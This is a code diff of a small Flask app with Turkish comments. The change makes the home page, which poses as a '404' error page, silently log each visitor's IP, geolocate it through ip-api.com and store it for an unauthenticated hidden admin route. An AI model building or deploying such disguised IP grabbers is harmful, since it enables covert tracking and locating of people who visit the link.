@@ -5,7 +5,7 @@ import requests
 
 app = Flask(__name__)
 
-# DB oluştur
+# ---------------- DB ----------------
 def init_db():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
@@ -25,7 +25,7 @@ def init_db():
 
 init_db()
 
-# IP bilgisi çek
+# ---------------- IP BİLGİ ----------------
 def ip_bilgi(ip):
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
@@ -36,13 +36,13 @@ def ip_bilgi(ip):
         pass
     return "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"
 
-# IP kaydet (30 dk kontrol var)
+# ---------------- EKLE (30 DK KORUMA) ----------------
 def ekle(ip):
     now = datetime.now()
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
 
-    # son kayıt kontrol
+    # son kayıt
     c.execute("SELECT tarih, saat FROM logs WHERE ip=? ORDER BY id DESC LIMIT 1", (ip,))
     last = c.fetchone()
 
@@ -50,7 +50,7 @@ def ekle(ip):
         last_time = datetime.strptime(last[0] + " " + last[1], "%Y-%m-%d %H:%M:%S")
         if now - last_time < timedelta(minutes=30):
             conn.close()
-            return  # 30 dk dolmadıysa ekleme
+            return
 
     ulke, sehir, isp = ip_bilgi(ip)
 
@@ -61,7 +61,7 @@ def ekle(ip):
     conn.commit()
     conn.close()
 
-# Liste çek
+# ---------------- LİSTE ----------------
 def getir():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
@@ -70,9 +70,14 @@ def getir():
     conn.close()
     return data
 
-# 404 SAYFA
+# ---------------- ANA SAYFA (IP KAYIT BURADA) ----------------
 @app.route("/")
 def home():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = ip.split(",")[0].strip()
+
+    ekle(ip)  # 🔥 BURASI EN ÖNEMLİ
+
     return """
     <html>
     <body style="background:black;color:white;text-align:center;font-family:Arial;padding-top:100px;">
@@ -86,13 +91,9 @@ def home():
     </html>
     """, 404
 
-# ADMIN PANEL
+# ---------------- ADMIN PANEL ----------------
 @app.route("/rexa/1103")
 def admin():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ip = ip.split(",")[0].strip()
-
-    ekle(ip)
     data = getir()
 
     html = """
@@ -122,5 +123,6 @@ def admin():
     html += "</body></html>"
     return html
 
+# ---------------- RUN ----------------
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
